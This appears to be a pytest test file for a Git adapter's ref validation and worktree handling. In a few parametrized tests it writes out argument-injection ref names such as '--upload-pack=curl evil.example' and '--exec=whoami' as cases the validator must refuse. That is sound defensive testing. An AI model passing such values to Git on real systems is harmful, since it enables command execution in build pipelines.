"""Reading another revision without disturbing this one.

Most of these are about the ref name. In CI it comes from the pull request, so it is
attacker-influenced, and Git reads a leading ``-`` as an option: a branch named
``--upload-pack=...`` is argument injection, not a branch.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from cost_gate.adapters.git import (
    GitError,
    is_git_repository,
    resolve_ref,
    validate_ref,
    worktree,
)

pytestmark = pytest.mark.unit


@pytest.fixture
def repository(tmp_path: Path) -> Path:
    """A small repository with two commits on the default branch."""
    run = lambda *args: subprocess.run(  # noqa: E731
        ["git", *args], cwd=tmp_path, check=True, capture_output=True, text=True
    )
    run("init", "--quiet")
    run("config", "user.email", "test@example.invalid")
    run("config", "user.name", "Test")
    run("config", "commit.gpgsign", "false")
    (tmp_path / "template.yaml").write_text("Resources: {}\n", encoding="utf-8")
    run("add", "-A")
    run("commit", "--quiet", "-m", "first")
    (tmp_path / "template.yaml").write_text("Resources: {A: {}}\n", encoding="utf-8")
    run("add", "-A")
    run("commit", "--quiet", "-m", "second")
    return tmp_path


class TestRefValidation:
    @pytest.mark.parametrize(
        "ref",
        [
            "--upload-pack=curl evil.example",
            "-c core.pager=id",
            "--exec=whoami",
        ],
    )
    def test_a_ref_that_looks_like_an_option_is_refused(self, ref):
        # This is the injection that matters: no shell is involved anywhere, so
        # metacharacters are inert, but Git itself will happily read an argument
        # beginning with a dash as an option.
        with pytest.raises(GitError, match="refusing"):
            validate_ref(ref)

    @pytest.mark.parametrize("ref", ["main..other", "HEAD..HEAD~3", "v1.0..v2.0"])
    def test_a_range_is_refused(self, ref):
        with pytest.raises(GitError, match="range"):
            validate_ref(ref)

    @pytest.mark.parametrize(
        "ref",
        ["a b", "refs:name", "what?", "star*", "br[x]"],
    )
    def test_characters_git_does_not_allow_in_a_refname_are_refused(self, ref):
        with pytest.raises(GitError):
            validate_ref(ref)

    @pytest.mark.parametrize(
        "ref",
        [
            "main",
            "origin/main",
            "release/2.1",
            "feature/COST-42-nat-gateway",
            "v1.0.0",
            "0f5c9e2a1b3d4f6a8c0e2b4d6f8a0c2e4b6d8f0a",
            # Revision expressions, not just refnames. Refusing these would teach
            # people to work around the tool, which is its own security problem.
            "HEAD~1",
            "origin/main^2",
        ],
    )
    def test_ordinary_refs_are_accepted(self, ref):
        # Over-strict validation that rejects real branch names would push people to
        # work around the tool, which is its own security problem.
        assert validate_ref(ref) == ref

    def test_an_empty_ref_is_refused(self):
        with pytest.raises(GitError):
            validate_ref("")


class TestRepositoryDetection:
    def test_a_repository_is_recognised(self, repository):
        assert is_git_repository(repository)

    def test_a_plain_directory_is_not(self, tmp_path):
        assert not is_git_repository(tmp_path)


class TestResolving:
    def test_a_ref_resolves_to_a_commit(self, repository):
        commit = resolve_ref("HEAD", repository=repository)
        assert len(commit) == 40

    def test_an_unknown_ref_is_an_error(self, repository):
        with pytest.raises(GitError):
            resolve_ref("does-not-exist", repository=repository)

    def test_an_unsafe_ref_is_refused_before_git_runs(self, repository):
        with pytest.raises(GitError, match="refusing"):
            resolve_ref("--exec=whoami", repository=repository)


class TestWorktree:
    def test_the_checkout_holds_the_requested_revision(self, repository):
        first = subprocess.run(
            ["git", "rev-parse", "HEAD~1"],
            cwd=repository,
            check=True,
            capture_output=True,
            text=True,
        ).stdout.strip()
        with worktree(first, repository=repository) as checkout:
            assert (checkout / "template.yaml").read_text(encoding="utf-8") == "Resources: {}\n"

    def test_the_working_tree_is_untouched(self, repository):
        # The whole reason for using a worktree rather than stash-and-checkout: an
        # interrupted run must not leave a developer's checkout somewhere they did not
        # ask to be.
        before = (repository / "template.yaml").read_text(encoding="utf-8")
        with worktree("HEAD~1", repository=repository):
            assert (repository / "template.yaml").read_text(encoding="utf-8") == before
        assert (repository / "template.yaml").read_text(encoding="utf-8") == before

    def test_the_checkout_is_removed_afterwards(self, repository):
        with worktree("HEAD", repository=repository) as checkout:
            location = checkout
        assert not location.exists()

    def test_the_checkout_is_removed_even_when_the_body_raises(self, repository):
        location: Path | None = None

        def fail() -> None:
            nonlocal location
            with worktree("HEAD", repository=repository) as checkout:
                location = checkout
                raise RuntimeError("something went wrong inside")

        with pytest.raises(RuntimeError):
            fail()
        assert location is not None
        assert not location.exists()

    def test_no_worktree_registration_is_left_behind(self, repository):
        with worktree("HEAD", repository=repository):
            pass
        listed = subprocess.run(
            ["git", "worktree", "list"],
            cwd=repository,
            check=True,
            capture_output=True,
            text=True,
        ).stdout
        assert listed.count("\n") == 1

    def test_an_unsafe_ref_never_reaches_git(self, repository):
        with (
            pytest.raises(GitError, match="refusing"),
            worktree("--upload-pack=id", repository=repository),
        ):
            pass
